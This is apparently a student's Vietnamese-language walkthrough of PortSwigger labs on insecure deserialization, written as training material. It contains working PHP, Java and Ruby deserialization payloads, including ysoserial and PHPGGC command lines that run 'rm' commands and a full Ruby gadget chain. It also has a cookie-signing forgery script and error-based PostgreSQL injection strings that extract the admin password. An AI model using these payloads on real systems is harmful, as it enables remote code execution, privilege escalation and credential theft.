# Insecure Deserialization

## Lab 1: Modifying serialized objects
Bài lab này là case cơ bản nhất của lỗ hổng insecure deserialization này khi ta có thể leo quyền nhờ thay đổi serialized object.

Lỗ hổng cơ bản này hay xuất hiện ở php, thì serial object được lưu ở trong session cookie và chỉ cần base64 decode là biết được nó lưu trữ cái gì

![image](https://hackmd.io/_uploads/Sk9nY9jRC.png)

Ở ảnh trên bạn thấy giá trị admin được lưu theo kiểu boolean `b:0` nghĩa là ta không phải admin. Chỉ cần sửa nó thành 1 là ta sẽ thành admin và xóa user carlos là solve bài lab. 
![image](https://hackmd.io/_uploads/SkTJj9sRR.png)

Sửa thành 1 và apply changes. Sau khi sửa thì mình đã có thể truy cập đến admin panel.

![image](https://hackmd.io/_uploads/B1_Bs9jR0.png)

![image](https://hackmd.io/_uploads/HJ0Di9iAC.png)

## Lab 2: Modifying serialized data types
Mô tả cũng khá giống bài lab trước nhưng chắc phải sửa xóa 1 chút nhiều hơn. 

Serial object chỉ có username và access token
![image](https://hackmd.io/_uploads/Sywr_aj0A.png)

Khi mình sửa username thành `administrator` thì sẽ báo lỗi `invalid access_token`
![image](https://hackmd.io/_uploads/SJft_6iAC.png)

Ở đây web đang so sánh access_token của 1 username với 1 chuỗi cố định. Và hint của bài này nó liên quan đến cách mà PHP so sánh các kiểu dữ liệu. Có lẽ nó liên quan đến type juggling trong php.
![image](https://hackmd.io/_uploads/Bk5A9TsCC.png)

Mình thấy số 0 khi so sánh với 1 chuỗi sẽ luôn trả về true, cho nên mình sẽ thử chuyển data type của access token thành số 0 `i:0;`

![image](https://hackmd.io/_uploads/ryBBsps0A.png)
Admin panel đã xuất hiện. Type juggling trong php cũng được coi là 1 lỗ hổng nếu lập trình viên không cần thận sử dụng loose comparisons với `==`.

Rồi truy cập đến `/admin/delete?username=carlos` là hoàn thành bài lab.
![image](https://hackmd.io/_uploads/HkPij6oA0.png)

## Lab 3: Using application functionality to exploit insecure deserialization
Bài lab này có tính năng sẽ gọi 1 method nguy hiểm khi mà được cung cấp serial object. Xóa `morale.txt` để solve bài lab.

Mình thấy có tính năng upload avatar là mình test luôn vì mình thấy khá giống bài lab trong lỗ hổng nào đó trước đây. Khi mình upload 1 file không hợp lệ sẽ hiện lỗi ra các hàm nguy hiểm mà mình có thể khai thác từ đó. 

Mình upload 1 file avatar không hợp lệ:
![image](https://hackmd.io/_uploads/rJC236sRR.png)

Trong serial object nó chứa 1 key khá thú vị là avatar link, nó sử dụng 1 đường dẫn tương đối để gán cho avatar của mình. 
![image](https://hackmd.io/_uploads/HJaGTasRC.png)

Mình nghĩ từ hàm này mình có thể đọc được source code của file đã hiện lỗi cho mình trước đó là `/home/carlos/avatar_upload.php`, set lại avatar link rồi truy cập vào avatar của chính mình.

![image](https://hackmd.io/_uploads/Sy_R6TjRC.png)
Nhận lại response 200

Nhưng avatar của mình lại không được set lại. Làm lại mấy lần nhưng không được. Có vẻ như suy đoán của mình đang sai.

Sau khi xem lại chức năng và mô tả bài lab. Mình thấy còn chức năng xóa 1 account và bài lab cung cấp cho mình thêm 1 account dự bị nữa. Có vẻ như là khi mình xóa account thì web sẽ xóa luôn cả avatar với file ở avatar link kia.

Set lại avatar với đường link đến file cần xóa
![image](https://hackmd.io/_uploads/r1Kc-CsAA.png)


Khi mình ấn nút delete ở bên ngoài browser thì lab vẫn chưa được solved. Mình check lại request đó và thấy rằng avatar link vẫn bị đổi về default. Có lẽ là nếu mình set avatar link không hợp lệ thì nó sẽ chuyển về default.

Giờ mình sẽ force nó bằng cách sửa luôn trong POST request delete này. Sau POST request này sẽ được redirect
![image](https://hackmd.io/_uploads/H1VrQAj0R.png)
 Và mình đã solve bài lab
 ![image](https://hackmd.io/_uploads/B1tUQAjAC.png)

## Lab 4: Arbitrary object injection in PHP
Bài lab muốn mình tự tạo ra 1 serial object để mà xóa đi file morale.txt của carlos. Sau khi đi dạo 1 vòng mình không thấy có tính năng gì hữu ích trên trang cả, và mình sửa thử cái serial object kia thì chỉ toàn lỗi mà không hiện ra thông tin gì hữu ích cả. 

Sau đó mình đọc lại request xem có gì hữu ích không thì có 1 file php ẩn bị comment
![image](https://hackmd.io/_uploads/ryaSW12AA.png)

Mình có thể truy cập được file này
![image](https://hackmd.io/_uploads/Hybvbk200.png)

Nhưng mà mình cần phải biết được source code của file ấy để mà tự tạo ra serial object và exploit. Hint bài lab có nói là dev thường tạo thêm 1 file backup và thêm dấu `~` vào tên file. Thêm dấu `~` vào cuối file mình đã có thể đọc được source code của nó.

```php=
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

Bài lab muốn mình xóa file `morale.txt` thì mình cần phải tận dụng được các magic method của class, đó chính là `__construct` và `__destruct`.

Hàm `__construct` giúp mình gán các giá trị cho property để mà có thể đưa tên file cần xóa vào và hàm `__destruct` để xóa file đi với hàm `unlink`.

Hàm `__construct` sẽ được gọi mỗi khi các object của class này được khởi tạo, và hàm `__destruct` sẽ được gọi khi mà object bị hủy hoặc code bị dừng hoặc thoát.

Ở đây mình sẽ xây dựng payload như sau
`O:14:"CustomTemplate":2:{s:18:"template_file_path";s:23:"/home/carlos/morale.txt";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

Bởi vì hàm `destruct` chỉ cần dùng thuộc tính `lock_file_path` cho nên giá trị `template_file_path` có hay không không quan trọng. Send bằng Burp Repeater có lẽ web nó đã tự động construct và destruct object của class này cho nên mình thấy bài lab được solve luôn. 

![image](https://hackmd.io/_uploads/HJL3ry20C.png)

## Lab 5: Exploiting Java deserialization with Apache Commons
Bài lab sử dụng các library của Apache Commons Collections. Mình có thể sử dụng các tool để mà khai thác bởi vì bài lab sử dụng các gadget chains đã được build sẵn.

Tool đó là `ysoserial`, cho phép mình sử dụng cách gadget chain được cung cấp với library mà target sử dụng.

Vì bài lab sử dụng serialized object của Java cho nên đoạn token ở dạng binary, khó mà có thể chỉnh sửa bằng tay, phải nhờ đến code. Đầu tiên mình cần phải xem xét bài lab sử dụng Common Collections nào.

Mình không hề tìm thấy bất cứ manh mối nào về phiên bản Collections mà bài lab sử dụng, cho nên mình sẽ tạo payload luôn và thử các CommonCollections.

Phiên bản mà bài lab sử dụng là Commons Collections 4 (mình check solution :v). Khi mình chạy ysoserial thì bị báo lỗi 
![image](https://hackmd.io/_uploads/SJDKGQnAA.png)

Xem hint của bài thì họ bảo là do phiên bản jdk đã khác cho nên phải thêm 1 số param như sau:

```
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   [payload] '[command]'
```
Nhưng mà mình chạy lệnh mà bài lab hint thì lại lỗi 
![image](https://hackmd.io/_uploads/Byi0M7h0R.png)

Loay hoay mãi mình mới biết là chuyển phần `-jar ysoserial-all.jar` xuống sau các `--add-opens` payload mới chạy. Nhớ phải chuyển nó sang base64 nếu không ysoserial sẽ trả về dạng java đã compiled.
![image](https://hackmd.io/_uploads/ByN4QX3C0.png)

Mặc dù dán payload vào cookie rồi send lên server sẽ bị 500 nhưng mà payload vẫn được thực thi và mình đã solve bài lab.
![image](https://hackmd.io/_uploads/ryL3QQh00.png)

## Lab 6: Exploiting PHP deserialization with a pre-built gadget chain
Bài lab này cũng giống bài lab trên là mình sẽ sử dụng các gadget chain đã được build sẵn nhưng đây là với php. Tool ở đây mình cần sử dụng là PHPGGC.

Session cookie có dạng json, mình cũng sẽ tìm loại gadget mà bài lab sử dụng xem nó có giấu đi như bài lab trên hay không
![image](https://hackmd.io/_uploads/SJbq4m2AR.png)

Session cookie sẽ có dạng sau: token chính là serialized object mà mình cần phải sửa đổi, ngoài ra còn có cặp key-value là `sig_hmac_sha1`, có lẽ token đã bị hash với 1 secret key để chúng ta không sửa đổi bừa serialized object kia.
![image](https://hackmd.io/_uploads/ByC2SQ3RA.png)


Sau khi đi hết 1 vòng và xem các request thì mình thấy có 1 đường dẫn thú vị cho phép mình xem phpinfo
![image](https://hackmd.io/_uploads/HyhbBm3CA.png)

Sau khi Ctrl+F tìm chữ key, thì thấy có 1 biến SECRET_KEY quan trọng.
![image](https://hackmd.io/_uploads/r1xVU7h00.png)

Đây có lẽ là secret key mà mình cần tìm để mà hash lại token. Nhưng mình lại không thấy framework mà lab sử dụng là cái nào. 
Mình thử nghịch ngợm session cookie, thay đổi signature thành chuỗi rỗng và thay đổi serialized object để xem có gì xảy ra không thì bất ngờ thay, lỗi hiện lên framework và cả version mà bài lab sử dụng.
![image](https://hackmd.io/_uploads/HJuJvQ2RR.png)

Giờ genenerate payload và tạo ra signature để tạo ra session cookie hợp lệ.

![image](https://hackmd.io/_uploads/H1YOvX3CA.png)
Symfony/RCE4 hợp lệ với phiên bản mà bài lab đang sử dụng 

![image](https://hackmd.io/_uploads/SyYHqm3CC.png)
Thấy 1 lệnh mẫu ở đây, mình sẽ sử dụng command
`./phpggc Symfony/RCE4 system rm '/home/carlos/morale.txt' | base64`

Mình base64 luôn mà không xem kết quả lệnh trước, may mà mình check lại vì lệnh phía trước đã bị lỗi.
![image](https://hackmd.io/_uploads/ByUXiXnRC.png)

Vừa nãy mình đặt nhầm vị trí dấu `'`. Payload đúng như ảnh
![image](https://hackmd.io/_uploads/HkiuoQhA0.png)

Tiếp theo là cần phải tạo lại session cookie, signature phải sử dụng hàm hash hmac với sha1. Mình đã có secret key trong tay.

Mình tìm thấy php có hàm `hash_hmac` với param đầu tiên là algo, param thứ 2 là string cần hash và thứ 3 là secret key. Sau khi tạo lại thì nhớ urlencode nó mới dán vào làm payload được
![image](https://hackmd.io/_uploads/Bk1VhmnR0.png)

Mình có đoạn code sau

```php=
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0K";
$secretKey = "s6mfw196vve0ihlsufk14fg78rne0urb";
echo urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
```

Sau khi chạy thì dán vào session cookie thôi.
Mặc dù hiện lỗi nhưng mình thấy bài lab vẫn hiện solved.
![image](https://hackmd.io/_uploads/SkR02m2A0.png)

## Lab 7: Exploiting Ruby deserialization using a documented gadget chain
Giống 2 bài lab trên nhưng là với Ruby
Ruby khá là lạ và khó với mình cho nên mình sẽ đọc solution làm case study.

Cũng giống Java thì serialized object đã bị binary hóa và không thể sửa bằng tay như php.
![image](https://hackmd.io/_uploads/B1uAT7nAA.png)

Mình search Ruby gadget chain thì hiện ra trang đầu tiên 
![image](https://hackmd.io/_uploads/rksGpHhAA.png)

Ở gần cuối trang thì sẽ có đoạn payload để mình tự chỉnh sửa.

```ruby=
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

Đầu tiên mình có sửa lệnh `id` mà đoạn code poc này có thực hiện thành `rm /home/carlos/morale.txt`, xóa file này để hoàn thành bài lab.
Tiếp theo là xuất payload dạng Base64 khi mình thay 2 dòng cuối cùng thành 1 dòng `puts Base64.encode64(payload)`

Chạy ở link online decompiler [này](https://domsignal.com/ruby-online-compiler), nó có phiên bản Ruby 2.7 mình cần để generate payload.

![image](https://hackmd.io/_uploads/rk6VRSnCA.png)

Dán payload vào trong session cookie thì mình cần phải xóa các dấu newline đi để payload không bị hỏng. 

![image](https://hackmd.io/_uploads/BkFPRB20A.png)
Mặc dù nó báo lỗi, nhưng mà bài lab vẫn hiện solved, nghĩa là payload của mình đã hoạt động. 

## Lab 8: Developing a custom gadget chain for PHP deserialization
Bài lab mong muốn chúng ta cần phải tự tạo 1 gadget chain để mà đạt được RCE.

Giống bài lab nào đó phía bên trên, mình tìm thấy được 1 file php bị comment trong html này.
![image](https://hackmd.io/_uploads/rJMNJLn00.png)

Và vẫn có thể sử dụng cách thêm dấu `~` để đọc source code của nó. 

```php=
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

Đầu tiên mình thấy đoạn code sau có thể tận dụng để thực hiện RCE
```php=
public function __get($name) {
        return call_user_func($this->callback, $name);
    }
```

Hàm `__get` sửa dụng hàm call_user_func với giá trị là `$callback` mình có thể gán cho nó, và `$name` có thể truyền vào hàm `__get` này và mình cần tìm hiểu sâu hơn 2 hàm này. 

> __get() is utilized for reading data from inaccessible (protected or private) or non-existing properties.

Đại khái thì nó được sử dụng để đọc dữ liệu từ các thuộc tính không thể truy cập (private hoặc protected) hoặc các thuộc tính không tồn tại. 

> Note:
> The return value of __set() is ignored because of the way PHP processes the assignment operator. Similarly, __get() is never called when chaining assignments together like this:

 $a = $obj->b = 8;
 
> Note:
> PHP will not call an overloaded method from within the same overloaded method. That means, for example, writing return $this->foo inside of __get() will return null and raise an E_WARNING if there is no foo property defined, rather than calling __get() a second time. However, overload methods may invoke other overload methods implicitly (such as __set() triggering __get()).

Từ docs trên thì có thể hiểu nó là trong class, nếu 1 thuộc tính được set private và có magic method `__get` này thì mình có thể set trực tiếp từ object được tạo. Kiểu là

```
class ConNguoi
{
    private $name = "Vũ Văn Hậu";

    public function __get($key)
    {
        //kiểm tra xem trong class có tồn tại thuộc tính không
        if (property_exists($this, $key)) {
            //tiến hành lấy giá trị
            return $this->$key;
        } else {
            die('Không tồn tại thuộc tính');
        }
    }

    public function getName()
    {
        echo $this->name;
    }
}

$connguoi = new ConNguoi();

echo $connguoi->name;
//Vũ Văn Hậu

$connguoi->age;
//Không tồn tại thuộc tính
```

Còn hàm `call_user_func` mình có thể sử dụng nó để RCE bởi vì mình có thể call như sau `call_user_func("exec","rm /home/carlos/morale.txt")` là chúng ta có thể RCE và hoàn thành bài lab.

Tiếp theo mình cần tìm hiểu cách để gọi tới hàm này.

Mình thấy gọi trực tiếp đến class DefaultMap là không thể bởi vì nó chỉ có 1 thuộc tính, và mình cần 2 thuộc tính mới có thể thực hiện được payload. Mình thấy chỉ có cách là đi từ CustomTemplate bởi vì nó có thể tạo ra 1 Product và từ Product chúng ta có thể tạo ra DefaultMap. 

Lần trước mình có làm bài lab này rồi nhưng mà không note lại. Giờ mình thử làm lại và ngồi ngẫm mất 10 phút và debug payload thì payload của mình như sau:

`O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";};}`

Mặc dù response 500 nhưng mà vẫn hoàn thành được bài lab.
![image](https://hackmd.io/_uploads/rJR5HLhCR.png)

Giờ mình sẽ giải thích như sau: 
Mình thấy hàm `__get` của DefaultMap muốn gọi được nó thì cần phải có code như sau DefaultMap->abcd. Và abcd là payload mình cần thực hiện để hoàn thành bài lab. Gán cho callback là exec thì dễ rồi. Mình thấy class Product với constructor như bên dưới.

```php=
public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
```

Vậy mình có thể gọi Product như sau
`Product("rm /home/carlos/morale.txt","Defaultmap")`, mỗi khi khởi tạo Product thì hàm construct tự động được gọi và khi đó code sẽ như sau
`$this->DefaultMap = DefaultMap->"rm /home/carlos/morale.txt"`
Và ngoài ra, khi truyền DefaultMap vào đây, bạn cần tận dụng nó để gán luôn cho callback thành `exec` thì payload mới hoạt động. 

Đọc cũng thấy khá phức tạp nhưng mà ngẫm xong thì sẽ thấy rất hay.

## Lab 9: Using PHAR deserialization to deploy a custom gadget chain
Bài lab không sử dụng serialized object 1 cách rõ ràng, nhưng mình có thể kết hợp với `PHAR` desearialization để đạt được RCE với gadget chain tự xây dựng. 
Kĩ thuật này khá là khó nên mình sẽ đọc solution làm case study.

Ở đây mình có chức năng upload avatar nhưng chỉ nhận `JPG` extension. 
Sau khi upload 1 file hợp lệ, mình cần phải bật tất cả MIME type lên để hiện các request bị ẩn. Default sẽ không hiện các images, css hay binary.
![image](https://hackmd.io/_uploads/S1VsuLh0C.png)

Sau khi bật lên mình thấy request đến `/cgi-bin/avatar.php`
![image](https://hackmd.io/_uploads/SJeyKLnAC.png)

Khi truy cập vào `/cgi-bin`, các file source code sẽ hiện lên 
![image](https://hackmd.io/_uploads/H1EMt82R0.png)

```php=
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```

Đây là file Blog.php, mình thấy hàm `wakeup` sẽ gọi đến Twig_Environment với giá trị là loader và trong đó có `desc` mình kiểm soát được. 

Mình chưa hiểu chain của bài này lắm cho nên làm lại sau.

## Lab 10: Developing a custom gadget chain for Java deserialization

Để giải bài lab này thì mình cần lấy được admin password và truy cập admin panel rồi xóa user carlos. Mình cần phải truy cập được vào source code và xây dựng gadget để mà lấy được password. 

Như thường lệ, thì bài lab sẽ comment path đến file mình cần đọc source code
![image](https://hackmd.io/_uploads/rk3JNr6AR.png)

Khi truy cập vào `/backup` thôi thì tất cả file hiện lên. 
![image](https://hackmd.io/_uploads/rJsHSH6RC.png)

`AccessTokenUser.java`	
```java=
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

`ProductTemplate.java`
```java=
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

Theo mình thấy ở file `ProductTemplate.java` thì có 1 lệnh query đến database mà nó truyền trực tiếp giá trị mình id, và database mà web sử dụng đó là `postgres`.

```java=
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
```

Giờ mình cần phải tạo 1 object là `ProductTemplate` và gán cho nó id là 1 lệnh Postgresqli.

Hint của bài lab có đưa cho mình 1 đoạn code example của Java deser, và do mình không quen với java deser cho lắm nên mình sử dụng luôn. 

![image](https://hackmd.io/_uploads/HkeqcrT00.png)

Phần `Foo.java` mình sẽ sửa thành `ProductTemplate.java` trong leaked source code của bài lab. 

Các phần thêm vào như là package `data.productcatalog` nếu không sẽ bị lỗi này giống mình
![image](https://hackmd.io/_uploads/BJbkiHaCA.png)

Tiếp theo mình quên thêm 2 phần serialVersionUID và transient Product cho nên bị lỗi này
![image](https://hackmd.io/_uploads/ry1MirpRC.png)

`serialVersionUID` thì thêm trực tiếp rồi còn Product thì mình sẽ thêm 1 dummy class vào package catalog kia. Do bài lab đã có đoạn code solution nên mình sẽ để ở [đây](https://github.com/PortSwigger/serialization-examples/tree/master/java/solution).

`id` thêm vào là payload sqli, cho nên mình sẽ tìm hiểu về số cột của bảng product.

Có vẻ như postgres không thể tìm số cột với `order by` được. Cho nên mình dùng `UNION select null,null,...` luôn. Khi số cột sai sẽ hiện lỗi sau
![image](https://hackmd.io/_uploads/r19raSpRA.png)

Khi mình select null đến 8 lần thì mới xuất hiện 1 lỗi khác, có vẻ như 8 cột là đúng. Mình suy đoán là query sẽ lấy data từ bảng product rồi chuyển nó thành `serializable.AccessTokenUser` cho nên sẽ hiện ra lỗi này.
![image](https://hackmd.io/_uploads/Bk0G0H6RR.png)

Mình nhận ra là bài lab này không hiển thị kết quả của các câu query mà chỉ hiện lỗi cho nên phần SQLi này thuộc vào error-based SQLi. Giờ mình sẽ tìm hiểu datatype của từng cột.

Cột nào đúng datatype sẽ hiện lỗi như việc select null 8 lần bên trên, ở đây mình thử cột đầu tiên là string.
![image](https://hackmd.io/_uploads/By6n6DpRR.png)

Ở đây mình thấy được cột thứ 4 sử dụng kiểu dữ liệu là integer, và nó cần thiết để khi mình dùng hàm CAST 1 string sang integer nó sẽ hiện ra lỗi hữu ích. 
![image](https://hackmd.io/_uploads/H1IVAPp0R.png)

Payload: `' UNION SELECT NULL, NULL, NULL, CAST((SELECT table_name from information_schema.tables LIMIT 1) AS int), NULL, NULL, NULL, NULL--`
![image](https://hackmd.io/_uploads/HJe7ed6RR.png)
Bảng đầu tiên là `users` và mục tiêu của mình nhắm đến là password của admin cho nên lấy tên table đã xong. Giờ xem cột của nó.

Payload: `' UNION SELECT NULL, NULL, NULL, CAST((SELECT column_name from information_schema.columns WHERE table_name='users' LIMIT 1) AS int), NULL, NULL, NULL, NULL--`
![image](https://hackmd.io/_uploads/rk0Oeda0A.png)

Muốn xem cột thứ hai thì mình thêm giá trị offset vào. `OFFSET n` thì kết quả lệnh query sẽ bỏ qua n dòng.
Payload: `' UNION SELECT NULL, NULL, NULL, CAST((SELECT column_name from information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1) AS int), NULL, NULL, NULL, NULL--`

Cột password đã ở đây.
![image](https://hackmd.io/_uploads/SytkWOaRA.png)

Do mình đã biết tên user cần tìm là `administrator` cho nên lấy password của admin luôn.

Payload: `' UNION SELECT NULL, NULL, NULL, CAST((SELECT password from users WHERE username='administrator') AS int), NULL, NULL, NULL, NULL--`

![image](https://hackmd.io/_uploads/rJZHZOpA0.png)

Đăng nhập và xóa user carlos, mình sẽ hoàn thành bài lab. 
![image](https://hackmd.io/_uploads/BJNdZ_p0R.png)

P/s: Mình dùng online compiler của replit.com. 